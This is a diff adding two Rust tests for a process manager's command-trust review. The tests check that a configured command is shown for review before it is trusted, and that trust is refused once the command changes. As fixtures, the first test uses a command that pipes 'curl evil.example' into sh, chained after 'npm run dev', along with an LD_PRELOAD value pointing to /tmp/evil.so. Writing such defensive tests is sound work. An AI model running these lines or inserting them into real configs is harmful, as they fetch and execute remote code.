@@ -178,6 +178,75 @@ async fn trust_command_makes_an_untrusted_command_startable() {
 }
 
 #[tokio::test]
+async fn command_review_reports_what_a_grant_would_authorize_on_a_first_open() {
+    let (facade, _trust) = facade(FakeSpawner::exits_on_terminate());
+    let dir = tempfile::tempdir().expect("temp dir");
+    std::fs::write(
+        crate::config::config_path(dir.path()),
+        "processes:\n  Web:\n    command: npm run dev ; curl evil.example | sh\n    working_dir: api\n    env:\n      LD_PRELOAD: /tmp/evil.so\n",
+    )
+    .expect("write solo.yml");
+    // Opening a project observes no change, so nothing publishes a review — the detail has
+    // to be answerable on demand or the only trust affordance shows a bare name.
+    let project = facade.load_project(dir.path()).expect("load");
+
+    let review = facade
+        .command_review(project.id, "Web")
+        .expect("the configured command is reviewable");
+
+    assert_eq!(review.command, "npm run dev ; curl evil.example | sh");
+    assert_eq!(review.working_dir.as_deref(), Some("api"));
+    assert_eq!(
+        review.env.get("LD_PRELOAD").map(String::as_str),
+        Some("/tmp/evil.so")
+    );
+    // A command that is not in the file has nothing to authorize.
+    assert!(facade.command_review(project.id, "Missing").is_none());
+}
+
+#[tokio::test]
+async fn a_review_cannot_trust_a_command_variant_that_changed_after_it_was_shown() {
+    let (facade, _trust) = facade(FakeSpawner::exits_on_terminate());
+    let dir = tempfile::tempdir().expect("temp dir");
+    let config = crate::config::config_path(dir.path());
+    std::fs::write(
+        &config,
+        "processes:\n  Web:\n    command: npm run reviewed\n",
+    )
+    .expect("write reviewed solo.yml");
+    let project = facade.load_project(dir.path()).expect("load");
+    let review = facade
+        .command_review(project.id, "Web")
+        .expect("review Web");
+
+    std::fs::write(
+        &config,
+        "processes:\n  Web:\n    command: npm run replacement\n",
+    )
+    .expect("replace solo.yml");
+    facade
+        .reload_project(project.id)
+        .expect("reload changed command");
+
+    assert!(matches!(
+        facade.trust_reviewed_command(project.id, "Web", &review.variant_hash),
+        Err(TrustCommandError::ChangedSinceReview)
+    ));
+    let current = facade
+        .command_review(project.id, "Web")
+        .expect("current command");
+    assert_ne!(current.variant_hash, review.variant_hash);
+    assert!(
+        facade
+            .snapshot()
+            .into_iter()
+            .find(|process| process.label == "Web")
+            .expect("Web remains registered")
+            .requires_trust
+    );
+}
+
+#[tokio::test]
 async fn trust_command_rejects_an_unknown_command() {
     let (facade, _trust) = facade(FakeSpawner::exits_on_terminate());
     let dir = tempfile::tempdir().expect("temp dir");
